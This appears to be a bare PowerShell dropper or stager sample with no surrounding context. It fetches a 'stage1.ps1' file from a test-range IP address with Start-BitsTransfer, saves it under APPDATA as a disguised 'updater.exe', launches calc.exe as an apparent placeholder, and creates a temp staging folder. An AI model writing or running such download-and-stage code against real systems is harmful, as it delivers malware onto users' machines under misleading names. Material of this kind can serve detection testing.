
$TargetUrl = "https://192.0.2.197/stage1.ps1"; $PayloadPath = "$env:APPDATA\updater.exe"; $RequestTimeout = 116; try { Start-BitsTransfer -Source $TargetUrl -Destination $PayloadPath; Start-Process -FilePath "calc.exe"; $StageMarker = "stage-3"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Remote fetch failed" }
